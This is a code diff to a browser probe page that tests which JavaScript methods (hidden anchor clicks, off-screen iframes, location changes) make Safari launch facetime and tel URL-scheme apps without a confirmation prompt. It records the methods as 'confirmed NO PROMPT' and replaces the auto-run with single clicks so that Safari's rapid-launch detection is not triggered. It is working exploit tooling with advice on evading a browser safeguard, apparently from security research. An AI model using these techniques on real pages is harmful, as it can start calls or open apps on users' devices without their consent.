@@ -44,9 +44,16 @@ pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height
   <div class="stats" id="stats"></div>
   <div class="verdict v-wait" id="verdict">idle</div>
 
-  <button class="danger" onclick="runAll()">Run ALL probes (sequential, 3s each)</button>
-  <button class="alt" onclick="runCategory('critical')">Critical impact only</button>
-  <button class="alt" onclick="runCategory('high')">High impact only</button>
+  <div style="margin:8px 0">
+    <label style="font-size:12px;color:#8b949e">Method (from ft.html results):</label>
+    <select id="method" style="width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;color:#c9d1d9;font-size:13px;margin:4px 0">
+      <option value="anchor">anchor.click() — confirmed NO PROMPT for facetime/tel</option>
+      <option value="iframe">iframe src= — confirmed NO PROMPT for facetime/tel</option>
+      <option value="location">location.href= — confirmed NO PROMPT for facetime/tel</option>
+      <option value="open">window.open() — SHOWS PROMPT (control)</option>
+    </select>
+  </div>
+  <p class="sub" style="color:#e3b341">Click each scheme individually. Do NOT auto-run — Safari detects rapid sequential scheme launches and starts prompting for all of them.</p>
 
   <div id="out"></div>
   <pre id="log"></pre>
@@ -171,39 +178,68 @@ async function testOne(s) {
 
 function probe(s) {
   return new Promise(resolve => {
+    const method = document.getElementById('method').value;
     const sandbox = document.getElementById('sandbox');
     const rdiv = document.getElementById('r-' + s.scheme);
     const ediv = document.getElementById('e-' + s.scheme);
     let launched = false;
 
-    lg(`probing ${s.scheme}://`);
-    rdiv.textContent = 'testing...';
-
-    const iframe = document.createElement('iframe');
-    iframe.style.cssText = 'width:1px;height:1px;border:0';
-    iframe.src = s.url;
+    lg(`probing ${s.scheme}:// via ${method}`);
+    rdiv.textContent = `testing via ${method}...`;
 
     const onBlur = () => {
       launched = true;
       const ms = Math.round(performance.now() - t0);
-      results[s.scheme] = {launched: true, ms, method: 'iframe'};
-      rdiv.innerHTML = `<span style="color:#ff7b72;font-weight:700">LAUNCHED in ${ms}ms — app opened without prompt!</span>`;
+      results[s.scheme] = {launched: true, ms, method};
+      rdiv.innerHTML = `<span style="color:#ff7b72;font-weight:700">LAUNCHED in ${ms}ms via ${method} — NO PROMPT!</span>`;
       ediv.className = 'e launched';
-      lg(`${s.scheme}: LAUNCHED at +${ms}ms`);
+      lg(`${s.scheme}: LAUNCHED at +${ms}ms via ${method}`);
     };
 
     window.addEventListener('blur', onBlur);
     const t0 = performance.now();
-    sandbox.appendChild(iframe);
+
+    try {
+      switch(method) {
+        case 'anchor': {
+          const a = document.createElement('a');
+          a.href = s.url;
+          a.textContent = s.scheme;
+          a.style.cssText = 'position:absolute;left:-9999px';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => { try { document.body.removeChild(a); } catch(e) {} }, 100);
+          break;
+        }
+        case 'iframe': {
+          const f = document.createElement('iframe');
+          f.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
+          f.src = s.url;
+          sandbox.appendChild(f);
+          break;
+        }
+        case 'location': {
+          location.href = s.url;
+          break;
+        }
+        case 'open': {
+          window.open(s.url, '_blank');
+          break;
+        }
+      }
+    } catch(e) {
+      lg(`${s.scheme}: ERROR ${e.name}: ${e.message}`);
+      rdiv.innerHTML = `<span style="color:#e3b341">error: ${e.name}</span>`;
+    }
 
     setTimeout(() => {
       window.removeEventListener('blur', onBlur);
-      try { sandbox.removeChild(iframe); } catch(e) {}
+      try { sandbox.innerHTML = ''; } catch(e) {}
       if (!launched) {
-        results[s.scheme] = {launched: false, method: 'iframe'};
-        rdiv.innerHTML = `<span style="color:#7ee787">blocked — no app launched (3s timeout)</span>`;
+        results[s.scheme] = {launched: false, method};
+        rdiv.innerHTML = `<span style="color:#7ee787">blocked via ${method} (3s timeout)</span>`;
         ediv.className = 'e blocked';
-        lg(`${s.scheme}: blocked`);
+        lg(`${s.scheme}: blocked via ${method}`);
       }
       updateStats();
       resolve(results[s.scheme]);
@@ -211,36 +247,8 @@ function probe(s) {
   });
 }
 
-async function runAll() {
-  if (running) return;
-  running = true;
-  document.getElementById('verdict').className = 'verdict v-info';
-  document.getElementById('verdict').textContent = 'running...';
-  for (const s of SCHEMES) {
-    await probe(s);
-    await new Promise(r => setTimeout(r, 500));
-    window.focus();
-    await new Promise(r => setTimeout(r, 200));
-  }
-  running = false;
-  finalize();
-}
-
-async function runCategory(risk) {
-  if (running) return;
-  running = true;
-  const items = SCHEMES.filter(s => s.risk === risk);
-  document.getElementById('verdict').className = 'verdict v-info';
-  document.getElementById('verdict').textContent = `testing ${items.length} ${risk} schemes...`;
-  for (const s of items) {
-    await probe(s);
-    await new Promise(r => setTimeout(r, 500));
-    window.focus();
-    await new Promise(r => setTimeout(r, 200));
-  }
-  running = false;
-  finalize();
-}
+// No auto-run — Safari's heuristic detects rapid sequential scheme launches
+// and starts prompting for ALL of them. Click each one individually.
 
 function updateStats() {
   const launched = Object.values(results).filter(r => r.launched).length;
